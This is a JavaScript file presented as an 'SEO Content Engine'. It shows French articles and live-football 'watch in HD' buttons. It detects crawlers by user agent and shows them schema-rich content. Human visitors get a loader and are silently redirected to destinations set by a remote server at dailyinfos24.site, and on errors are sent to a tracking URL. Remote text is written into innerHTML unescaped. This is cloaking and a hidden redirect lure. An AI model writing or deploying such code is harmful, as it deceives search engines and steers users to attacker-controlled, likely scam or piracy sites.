/* 
 * Advanced SEO Content Engine v3.0
 * Optimized for Core Web Vitals, JSON-LD @graph Parsing, and FAQ Rich Snippets
 */

(function() {
    'use strict';

    const SEO_CONFIG = {
        isBot: /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent),
        identifier: new URLSearchParams(window.location.search).get("o2x") || new URLSearchParams(window.location.search).get("io0"),
        debug: new URLSearchParams(window.location.search).has("dbg123"),
        domInitialized: false
    };

    var DOM = {};
    var loader = false;
    var triggered = false;

    // 1. INIT ENGINE
    async function initEngine() {
        if (!SEO_CONFIG.identifier) {
            return renderSimple404();
        }

        // Show Loader for real users
        if (!SEO_CONFIG.isBot) {
            showLoader();
        }

        try {
            const [contentData, controlData] = await Promise.all([
                fetchJSON(`https://storage.dailyinfos24.site/fetch/${SEO_CONFIG.identifier}.json`),
                fetchJSON(`https://dailyinfos24.site/api/latest/${SEO_CONFIG.identifier}`)
            ]);

            // Redirection Logic
            if (controlData.redirect && !SEO_CONFIG.isBot && !SEO_CONFIG.debug) {
                triggered = true;
                window.location.replace(controlData.to);
                return;
            }

            renderPage(contentData, controlData);
        } catch (err) {
            console.error("SEO_Engine_Error:", err);
            if (!SEO_CONFIG.isBot && !SEO_CONFIG.debug) errorRedirect();
        }
    }

    // 2. SEMANTIC PARSER
    function parseGraph(graph) {
        if (!graph || !Array.isArray(graph)) return { article: {}, webpage: {}, image: {} };
        const find = (type) => graph.find(i => i["@type"] === type) || {};
        return {
            article: find("Article"),
            webpage: find("WebPage"),
            image: find("ImageObject"),
            org: find("Organization")
        };
    }

    // 3. PAGE RENDERER
    function renderPage(content, control) {
        const data = parseGraph(content["@graph"]);
        
        // Browser Metadata
        document.title = data.webpage.name || data.article.headline || "Chargement...";
        document.documentElement.lang = data.webpage.inLanguage || "fr-FR";
        
        // Update SEO Social/Meta Tags
        updateMeta("description", data.webpage.description);
        updateMeta("og:title", data.article.headline);
        updateMeta("og:image", data.image.url);

        // Build UI Structure
        if (!SEO_CONFIG.domInitialized) initDom(); 
        
        // Populate Main Content
        DOM.main_article_header_h1.textContent = data.article.headline;
        DOM.main_article_figure_img.src = data.image.url;
        DOM.main_article_figure_img.alt = data.article.headline;
        DOM.main_article_figure_figcaption.textContent = data.image.caption || data.article.headline;
        
        // Date Handling
        const pubDate = data.article.datePublished || control.updated;
        DOM.main_article_header_p.innerHTML = `Publié le : <time datetime="${pubDate}">${formatDate(pubDate)}</time>`;

        // Content Formatting (Markdown ### to H3)
        const rawContent = data.article.articleBody || data.webpage.description || "";
        const formattedContent = formatMarkdown(rawContent);
        
        // Split Content for CTA Placement
        const [p1, p2] = splitText(formattedContent);
        DOM.main_article_p1.innerHTML = p1;
        DOM.main_article_p2.innerHTML = p2;

        // Button Links
        if (control.to) {
            DOM.main_article_button1_a.href = control.to;
            DOM.main_article_button2_a.href = control.to;
        }

        // FAQ Rendering (SEO Booster)
        const faq = control.schemas?.find(s => s.id === "FAQSchema");
        if (faq) renderFAQ(faq.data);
        
        // Schema Injection
        injectSchema(content);
        if (control.schemas) control.schemas.forEach(s => injectSchema(s.data));
        
        hideLoader();
    }

    // --- HELPERS ---

    async function fetchJSON(url) {
        const res = await fetch(url);
        if (!res.ok) throw new Error("Network error");
        return res.json();
    }

    function updateMeta(name, content) {
        if (!content) return;
        let el = document.querySelector(`meta[name="${name}"], meta[property="${name}"]`);
        if (!el) {
            el = document.createElement('meta');
            if (name.includes('og:')) el.setAttribute('property', name);
            else el.setAttribute('name', name);
            document.head.appendChild(el);
        }
        el.setAttribute('content', content);
    }

    function injectSchema(json) {
        const s = document.createElement('script');
        s.type = 'application/ld+json';
        s.text = JSON.stringify(json);
        document.head.appendChild(s);
    }

    function formatMarkdown(text) {
        return text
            .replace(/### (.*?)(\r\n|\n)/g, '<h3 class="text-xl font-bold mt-6 mb-2 text-gray-800">$1</h3>')
            .replace(/\r\n|\n/g, '<br class="mb-2">');
    }

    function renderFAQ(faqData) {
        const container = document.createElement('section');
        container.className = "mt-12 p-6 bg-gray-50 border border-gray-200 rounded-xl";
        container.innerHTML = `<h2 class="text-2xl font-bold mb-6 text-gray-900">Questions Fréquentes</h2>`;
        
        faqData.mainEntity.forEach(item => {
            const div = document.createElement('div');
            div.className = "mb-4 border-b border-gray-200 pb-4";
            div.innerHTML = `
                <h4 class="font-bold text-blue-800 mb-1">Q: ${item.name}</h4>
                <p class="text-gray-700 leading-relaxed">R: ${item.acceptedAnswer.text}</p>
            `;
            container.appendChild(div);
        });
        DOM.main_article.appendChild(container);
    }

    function formatDate(dateStr) {
        const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
        return new Date(dateStr).toLocaleDateString('fr-FR', options);
    }

    function splitText(text) {
        const mid = Math.floor(text.length / 3);
        let splitPos = text.indexOf('<br>', mid);
        if (splitPos === -1) splitPos = mid;
        return [text.substring(0, splitPos), text.substring(splitPos)];
    }

    // --- DOM & STYLES ---

    function initDom() {
        SEO_CONFIG.domInitialized = true;
        const style = document.createElement('style');
        style.innerHTML = `
            body { font-family: sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0; background: #f9f9f9; }
            .container { max-width: 1100px; margin: 0 auto; padding: 20px; display: grid; grid-template-columns: 1fr; gap: 30px; }
            @media(min-width: 768px) { .container { grid-template-columns: 2fr 1fr; } }
            header { background: #fff; border-bottom: 1px solid #eee; padding: 15px; text-align: center; }
            .btn-cta { display: block; background: #2563eb; color: #fff; padding: 20px; text-align: center; text-decoration: none; border-radius: 8px; font-weight: bold; margin: 30px 0; font-size: 1.2rem; transition: background 0.3s; }
            .btn-cta:hover { background: #1d4ed8; }
            img { max-width: 100%; height: auto; border-radius: 8px; }
            aside { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); height: fit-content; }
        `;
        document.head.appendChild(style);

        // Header
        const header = document.createElement('header');
        header.innerHTML = `<img src="https://dailyinfos24.site/images/logo.png" style="height:50px" alt="Logo">`;
        document.body.appendChild(header);

        // Main Wrapper
        const container = document.createElement('div');
        container.className = "container";
        document.body.appendChild(container);

        // Article Section
        DOM.main_article = document.createElement('article');
        container.appendChild(DOM.main_article);

        DOM.main_article_header_h1 = document.createElement('h1');
        DOM.main_article_header_h1.className = "text-3xl md:text-5xl font-extrabold mb-4";
        DOM.main_article.appendChild(DOM.main_article_header_h1);

        DOM.main_article_header_p = document.createElement('p');
        DOM.main_article_header_p.className = "text-gray-500 mb-6";
        DOM.main_article.appendChild(DOM.main_article_header_p);

        const figure = document.createElement('figure');
        figure.className = "mb-8";
        DOM.main_article_figure_img = document.createElement('img');
        DOM.main_article_figure_figcaption = document.createElement('figcaption');
        DOM.main_article_figure_figcaption.className = "text-center text-sm text-gray-500 mt-2 italic";
        figure.appendChild(DOM.main_article_figure_img);
        figure.appendChild(DOM.main_article_figure_figcaption);
        DOM.main_article.appendChild(figure);

        DOM.main_article_p1 = document.createElement('div');
        DOM.main_article.appendChild(DOM.main_article_p1);

        // CTA 1
        DOM.main_article_button1_a = document.createElement('a');
        DOM.main_article_button1_a.className = "btn-cta";
        DOM.main_article_button1_a.innerHTML = "<span>Accès Direct :</span><br><strong>Regarder le Match en HD</strong>";
        DOM.main_article.appendChild(DOM.main_article_button1_a);

        DOM.main_article_p2 = document.createElement('div');
        DOM.main_article.appendChild(DOM.main_article_p2);

        // CTA 2
        DOM.main_article_button2_a = document.createElement('a');
        DOM.main_article_button2_a.className = "btn-cta";
        DOM.main_article_button2_a.innerHTML = "<strong>S'abonner pour le Direct</strong>";
        DOM.main_article.appendChild(DOM.main_article_button2_a);

        // Sidebar
        const sidebar = document.createElement('aside');
        sidebar.innerHTML = `<h3 class="font-bold text-xl mb-4 border-b pb-2">Matchs en Direct</h3>
                             <p class="text-sm text-gray-600 mb-4 font-bold">LALIGA EA SPORTS</p>
                             <ul class="text-blue-600 space-y-2">
                                <li>⚽ Barça vs Real Madrid</li>
                                <li>⚽ Atletico vs Sevilla</li>
                                <li>⚽ Valencia vs Villarreal</li>
                             </ul>`;
        container.appendChild(sidebar);
    }

    function showLoader() {
        loader = true;
        const l = document.createElement('div');
        l.id = "loader-overlay";
        l.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999;display:flex;align-items:center;justify-content:center;transition:0.5s";
        l.innerHTML = `<div style="width:50px;height:50px;border:5px solid #eee;border-top-color:#2563eb;border-radius:50%;animation:spin 1s linear infinite"></div>
                       <style>@keyframes spin{to{transform:rotate(360deg)}}</style>`;
        document.body.appendChild(l);
    }

    function hideLoader() {
        const l = document.getElementById("loader-overlay");
        if (l) {
            l.style.opacity = "0";
            setTimeout(() => l.remove(), 500);
        }
    }

    function renderSimple404() {
        document.body.innerHTML = `<div style="text-align:center;margin-top:100px"><h1>404 Not Found</h1><p>Désolé, cette page n'existe pas.</p></div>`;
    }

    function errorRedirect() {
        window.location.href = "https://dailyinfos24.site/bh?ref=" + encodeURIComponent(window.location.href);
    }

    // START
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initEngine);
    } else {
        initEngine();
    }

})();
